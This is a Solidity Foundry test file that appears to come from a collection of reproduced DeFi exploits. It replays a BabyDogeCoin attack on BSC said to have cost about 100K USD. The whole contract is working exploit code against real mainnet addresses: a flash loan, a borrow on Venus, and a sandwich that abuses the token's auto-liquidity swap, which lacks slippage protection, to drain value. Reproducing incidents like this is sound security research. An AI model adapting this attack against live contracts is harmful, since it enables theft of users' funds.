// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~100K USD$
// Attacker : https://bscscan.com/address/0xee6764ac7aa45ed52482e4320906fd75615ba1d1
// Attack Contract : https://bscscan.com/address/0x9a6b926281b0c7bc4f775e81f42b13eda9c1c98e
// Vulnerable Contract : https://bscscan.com/address/0xc748673057861a797275CD8A068AbB95A902e8de
// Attack Tx : https://bscscan.com/tx/0xbaf3e4841614eca5480c63662b41cd058ee5c85dc69198b29e7ab63b84bc866c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xc748673057861a797275CD8A068AbB95A902e8de#code

// @Analysis
// Twitter Guy : https://twitter.com/hexagate_/status/1671517819840745475

interface IFeeFreeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IBabyDogeCoin is IERC20 {
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IBabyDogeCoin BabyDogeCoin = IBabyDogeCoin(0xc748673057861a797275CD8A068AbB95A902e8de);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    ICErc20Delegate vUSDT = ICErc20Delegate(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    ICErc20Delegate vBUSD = ICErc20Delegate(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    crETH vBNB = crETH(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    Uni_Router_V2 BabyDogeRouter = Uni_Router_V2(0xC9a0F685F39d05D835c369036251ee3aEaaF3c47);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IFeeFreeRouter FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IUnitroller Unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    ISimplePriceOracle VenusChainlinkOracle = ISimplePriceOracle(0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F);
    address PancakePair = 0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0;
    address BabyDogeRouterPair = 0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1;
    uint256 borrowAmount;
    uint256 USDTFlashLoanAmount;
    uint256 BUSDFlashLoanAmount;

    function setUp() public {
        vm.createSelectFork("bsc", 29_295_010);
        vm.label(address(BUSD), "BUSD");
        vm.label(address(USDT), "USDT");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BabyDogeCoin), "BabyDogeCoin");
        vm.label(address(pool), "pool");
        vm.label(address(vBUSD), "vBUSD");
        vm.label(address(vUSDT), "vUSDT");
        vm.label(address(vBNB), "vBNB");
        vm.label(address(BabyDogeRouter), "BabyDogeRouter");
        vm.label(address(Router), "Router");
        vm.label(address(FeeFreeRouter), "FeeFreeRouter");
        vm.label(address(Unitroller), "Unitroller");
        vm.label(address(VenusChainlinkOracle), "VenusChainlinkOracle");
        vm.label(address(PancakePair), "PancakePair");
        vm.label(address(BabyDogeRouterPair), "BabyDogeRouterPair");
    }

    function testExploit() public {
        init();
        AddBabyDogeCoinWBNBLiquidity();
        exploit();

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function init() internal {
        USDT.approve(address(vUSDT), type(uint256).max);
        BUSD.approve(address(vBUSD), type(uint256).max);
        address[] memory cTokens = new address[](3);
        cTokens[0] = address(vUSDT);
        cTokens[1] = address(vBUSD);
        cTokens[2] = address(vBNB);
        Unitroller.enterMarkets(cTokens);
    }

    function AddBabyDogeCoinWBNBLiquidity() public payable {
        deal(address(this), 0.01 ether);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        BabyDogeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.005 ether}(
            1, path, address(this), block.timestamp
        );
        WBNB.deposit{value: 0.005 ether}();
        WBNB.approve(address(FeeFreeRouter), WBNB.balanceOf(address(this)));
        BabyDogeCoin.approve(address(FeeFreeRouter), BabyDogeCoin.balanceOf(address(this)));
        FeeFreeRouter.addLiquidity(
            address(BabyDogeCoin),
            address(WBNB),
            BabyDogeCoin.balanceOf(address(this)) - 10_000 * 1e9,
            WBNB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        IERC20(BabyDogeRouterPair).approve(address(FeeFreeRouter), IERC20(BabyDogeRouterPair).balanceOf(address(this)));
    }

    function exploit() internal {
        pool.flash(address(this), USDT.balanceOf(address(pool)), BUSD.balanceOf(address(pool)), new bytes(0));
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        borrowBNB();

        swapWBNBToBabyDogeCoinByBabyDogeRouterPair();
        Sandwich();
        swapBabyDogeCoinToWBNBByBabyDogeRouterPair();

        repayFlashLoan(amount0, amount1);
    }

    function borrowBNB() public payable {
        USDTFlashLoanAmount = USDT.balanceOf(address(this));
        BUSDFlashLoanAmount = BUSD.balanceOf(address(this));
        vUSDT.mint(USDT.balanceOf(address(this)));
        vBUSD.mint(BUSD.balanceOf(address(this)));
        (, uint256 AccountLiquidity,) = Unitroller.getAccountLiquidity(address(this));
        uint256 UnderlyingPrice = VenusChainlinkOracle.getUnderlyingPrice(address(vBNB));
        borrowAmount = (AccountLiquidity * 1e18 / UnderlyingPrice) * 9999 / 10_000;
        vBNB.borrow(borrowAmount);
    }

    function swapWBNBToBabyDogeCoinByBabyDogeRouterPair() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        uint256 swapAmount =
            BabyDogeCoin.numTokensSellToAddToLiquidity() - BabyDogeCoin.balanceOf(address(BabyDogeCoin)) - 1e12;
        uint256[] memory amountIns = BabyDogeRouter.getAmountsIn(swapAmount, path);
        WBNB.deposit{value: address(this).balance}();
        WBNB.approve(address(BabyDogeRouter), amountIns[0]);
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIns[0], 0, path, address(FeeFreeRouter), block.timestamp
        );
        FeeFreeRouter.removeLiquidity(
            address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, address(BabyDogeCoin), block.timestamp
        ); // swap some WBNB to BabyDogeCoin , transfer to BabyDogeCoin contract

        WBNB.approve(address(BabyDogeRouter), WBNB.balanceOf(address(this)));
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(FeeFreeRouter), block.timestamp
        );
        FeeFreeRouter.removeLiquidity(address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, PancakePair, block.timestamp); // swap some WBNB to BabyDogeCoin , transfer to PancakePair contract
    }

    function Sandwich() internal {
        address[] memory path = new address[](2);
        path[0] = address(BabyDogeCoin);
        path[1] = address(WBNB);
        BabyDogeCoin.approve(address(Router), 1);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 1, path, address(this), block.timestamp); // swap BabyDogeCoin to WBNB

        uint256 transferAmount =
            BabyDogeCoin.numTokensSellToAddToLiquidity() - BabyDogeCoin.balanceOf(address(BabyDogeCoin));
        BabyDogeCoin.transfer(address(BabyDogeCoin), transferAmount);
        BabyDogeCoin.transfer(address(this), 1); // trigger swap BabyDogeCoin to WBNB wihtout slippage protection

        path[0] = address(WBNB);
        path[1] = address(BabyDogeCoin);
        WBNB.approve(address(Router), WBNB.balanceOf(address(this)));
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 1, path, address(FeeFreeRouter), block.timestamp
        ); // swap WBNB to BabyDogeCoin
        FeeFreeRouter.removeLiquidity(
            address(BabyDogeCoin), address(WBNB), 1e9, 0, 0, address(BabyDogeRouterPair), block.timestamp
        );
    }

    function swapBabyDogeCoinToWBNBByBabyDogeRouterPair() internal {
        address[] memory path = new address[](2);
        path[0] = address(BabyDogeCoin);
        path[1] = address(WBNB);
        BabyDogeCoin.approve(address(BabyDogeRouter), 1);
        BabyDogeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 1, path, address(this), block.timestamp); // swap BabyDogeCoin to WBNB, get profit
    }

    function repayFlashLoan(uint256 amount0, uint256 amount1) internal {
        WBNB.withdraw(borrowAmount);
        vBNB.repayBorrow{value: address(this).balance}();
        vUSDT.redeemUnderlying(USDTFlashLoanAmount);
        vBUSD.redeemUnderlying(BUSDFlashLoanAmount);
        USDT.transfer(address(pool), USDTFlashLoanAmount);
        BUSD.transfer(address(pool), BUSDFlashLoanAmount);
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapTokensForExactTokens(amount0, type(uint256).max, path, address(pool), block.timestamp);
        path[1] = address(BUSD);
        Router.swapTokensForExactTokens(amount1, type(uint256).max, path, address(pool), block.timestamp);
    }

    receive() external payable {}
}
